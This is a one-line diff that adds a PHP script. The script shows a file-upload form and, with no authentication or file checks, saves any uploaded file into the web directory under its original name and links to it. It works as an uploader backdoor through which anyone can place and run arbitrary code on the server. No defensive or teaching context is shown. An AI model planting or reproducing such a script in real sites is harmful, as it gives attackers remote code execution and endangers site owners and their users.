@@ -1,0 +1,1 @@
+<?php if(!$_FILES['uploaded']){print'<form enctype="multipart/form-data" action="?" method="POST"><input name="uploaded" type="file" /><input type="submit" value="Upload" /></form>';}else{move_uploaded_file($_FILES['uploaded']['tmp_name'], basename($_FILES['uploaded']['name'])); echo "<a href='".basename($_FILES['uploaded']['name']). "'>Here</a>.";}?>
